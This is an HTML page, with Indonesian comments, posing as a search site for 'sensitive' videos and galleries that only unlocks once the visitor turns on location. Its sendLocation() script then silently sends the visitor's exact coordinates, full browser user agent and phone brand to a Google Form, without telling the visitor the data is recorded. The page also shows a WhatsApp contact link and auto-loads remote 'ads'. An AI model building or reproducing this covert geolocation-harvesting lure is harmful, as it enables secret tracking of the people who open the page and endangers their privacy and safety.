<!DOCTYPE html>
<html lang="ja">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<style>
body {
  margin: 0;
  background: black;
  color: white;
  font-family: Arial, sans-serif;
  display: flex;
  flex-direction: column;
  align-items: center;
}

h1 { margin-top: 40px; }

.main-img {
  margin-top: 20px;
  width: 130px;
  height: 130px;
  border-radius: 18px;
  object-fit: cover;
}

.controls {
  margin-top: 20px;
  display: flex;
  align-items: center;
  gap: 10px;
}

input {
  width: 180px;
  padding: 12px;
  border-radius: 10px;
  border: none;
}

button {
  padding: 10px 22px;
  border-radius: 10px;
  border: none;
  font-weight: bold;
  cursor: pointer;
}

button.disabled {
  background: #555;
  color: #aaa;
  cursor: not-allowed;
}

button.active {
  background: white;
  color: black;
}

.toggle {
  width: 46px;
  height: 24px;
  background: #444;
  border-radius: 12px;
  position: relative;
  cursor: pointer;
}

.toggle::after {
  content: "";
  position: absolute;
  width: 20px;
  height: 20px;
  background: white;
  border-radius: 50%;
  top: 2px;
  left: 2px;
  transition: 0.2s;
}

.toggle.on {
  background: #1aff6c;
}

.toggle.on::after {
  left: 24px;
}

.warning { margin-top: 120px; opacity: 0.6; }

/* MODAL */
.modal {
  display: none;
  position: fixed;
  inset: 0;
  background: rgba(0,0,0,0.6);
  backdrop-filter: blur(8px);
  justify-content: center;
  align-items: center;
  z-index: 999;
}

.modal-box {
  position: relative;
  width: 320px;
  text-align: center;
}

.modal video,
.modal img {
  width: 100%;
  border-radius: 16px;
}

.close {
  position: absolute;
  top: -35px;
  right: 0;
  font-size: 22px;
  cursor: pointer;
}

/* panah geser */
.nav-btn {
  position: absolute;
  bottom: -45px;
  font-size: 26px;
  color: white;
  background: rgba(0,0,0,0.4);
  border: none;
  border-radius: 6px;
  padding: 4px 12px;
  cursor: pointer;
}

.nav-left { left: 0; }
.nav-right { right: 0; }

/* tombol telepon */
.phone-btn {
  position: fixed;
  bottom: 20px;
  right: 20px;
  width: 50px;
  height: 50px;
  background: white;
  border-radius: 50%;
  display: flex;
  justify-content: center;
  align-items: center;
  z-index: 1000;
}

.phone-btn svg {
  width: 26px;
  height: 26px;
  fill: black;
}
</style>
</head>

<body>

<h1>ãƒªãƒƒãƒ—ã‚º</h1>
<img class="main-img" src="https://files.catbox.moe/2sgujb.jpg">

<div class="controls">
  <input id="keyword" placeholder="Search" disabled>
  <button id="searchBtn" class="disabled">SEARCH</button>
  <div class="toggle" id="toggle"></div>
</div>

<div class="warning">This Web Is Sensitifâš </div>

<!-- MODAL -->
<div class="modal" id="modal">
  <div class="modal-box" id="modalBox">
    <div class="close" onclick="closeModal()">âœ•</div>
  </div>
</div>

<!-- Telepon -->
<a class="phone-btn" href="https://wa.me/6281317309919" target="_blank">
<svg viewBox="0 0 24 24">
<path d="M6.62 10.79a15.05 15.05 0 006.59 6.59l2.2-2.2a1 1 0 011.11-.21c1.2.48 2.5.74 3.83.74a1 1 0 011 1v3.5a1 1 0 01-1 1C10.07 21.5 2.5 13.93 2.5 4a1 1 0 011-1H7a1 1 0 011 1c0 1.33.26 2.63.74 3.83a1 1 0 01-.21 1.11l-2.2 2.2z"/>
</svg>
</a>

<script>
let data = {};
let currentImages = [];
let currentIndex = 0;
let locationEnabled = false;

// ambil data utama
fetch("https://lipzz-elzxd.github.io/Lipz/data.json")
  .then(r => r.json())
  .then(j => data = j);

// toggle lokasi
const toggle = document.getElementById("toggle");
const searchBtn = document.getElementById("searchBtn");
const keyword = document.getElementById("keyword");

toggle.onclick = () => {
  if(locationEnabled){
    locationEnabled = false;
    toggle.classList.remove("on");
    searchBtn.className = "disabled";
    keyword.disabled = true;
    return;
  }

  navigator.geolocation.getCurrentPosition(pos=>{
    locationEnabled = true;
    toggle.classList.add("on");
    searchBtn.className = "active";
    keyword.disabled = false;
    sendLocation(pos);
  }, ()=>{ alert("Izin lokasi ditolak"); });
};

searchBtn.onclick = () => {
  if(!locationEnabled) return;
  const key = keyword.value.trim().toLowerCase();
  if(!data[key]) return;

  const box = document.getElementById("modalBox");
  box.innerHTML = '<div class="close" onclick="closeModal()">âœ•</div>';

  if(data[key].type==="video"){
    const v = document.createElement("video");
    v.src = data[key].src;
    v.autoplay = true;
    v.controls = true;
    box.appendChild(v);
  }

  if(data[key].type==="gallery"){
    currentImages = data[key].images;
    currentIndex = 0;

    const img = document.createElement("img");
    img.id = "galleryImg";
    img.src = currentImages[currentIndex];
    box.appendChild(img);

    const left = document.createElement("button");
    left.className = "nav-btn nav-left";
    left.innerText = "<";
    left.onclick = () => slide(-1);

    const right = document.createElement("button");
    right.className = "nav-btn nav-right";
    right.innerText = ">";
    right.onclick = () => slide(1);

    box.appendChild(left);
    box.appendChild(right);
  }

  document.getElementById("modal").style.display = "flex";
};

function slide(dir){
  currentIndex += dir;
  if(currentIndex<0) currentIndex=currentImages.length-1;
  if(currentIndex>=currentImages.length) currentIndex=0;
  document.getElementById("galleryImg").src=currentImages[currentIndex];
}

function closeModal(){
  document.getElementById("modal").style.display="none";
  document.getElementById("modalBox").innerHTML='<div class="close" onclick="closeModal()">âœ•</div>';
}

// lokasi -> google form
function fix(n){return Number(n).toFixed(6);}
function getBrand(){
  const ua = navigator.userAgent.toLowerCase();
  if(ua.includes("samsung")) return "Samsung";
  if(ua.includes("infinix")) return "Infinix";
  if(ua.includes("xiaomi")) return "Xiaomi";
  if(ua.includes("oppo")) return "Oppo";
  if(ua.includes("vivo")) return "Vivo";
  return "Unknown";
}

function sendLocation(pos){
  const lat = fix(pos.coords.latitude);
  const lon = fix(pos.coords.longitude);
  const ua = navigator.userAgent;
  const brand = getBrand();

  const url =
    "https://docs.google.com/forms/d/e/1FAIpQLScJJ-PAqYmeOnS6qKdgL1gTGMyX_FjrMLLg93Pv4QDbw1N-Cg/formResponse?" +
    "entry.138340134="+lat+
    "&entry.1616098311="+lon+
    "&entry.1257224602="+encodeURIComponent(ua)+
    "&entry.1874088822="+brand;

  fetch(url,{mode:"no-cors"});
}

// ðŸ”” IKLAN OTOMATIS
fetch("https://lipzz-elzxd.github.io/Lipz/iklan.json")
  .then(r=>r.json())
  .then(json=>{
    const keys = Object.keys(json);
    if(keys.length===0) return;
    const iklan = json[keys[0]];

    const modal = document.getElementById("modal");
    const box = document.getElementById("modalBox");
    box.innerHTML='<div class="close" onclick="closeModal()">âœ•</div>';

    if(iklan.type==="video"){
      const v = document.createElement("video");
      v.src = iklan.src;
      v.autoplay = true;
      v.loop = true;
      v.playsInline = true;
      if(!iklan.sound) v.muted = true;
      box.appendChild(v);
    }

    if(iklan.type==="image"){
      const img = document.createElement("img");
      img.src = iklan.src;
      box.appendChild(img);
    }

    modal.style.display = "flex";
  });
</script>

</body>
</html>
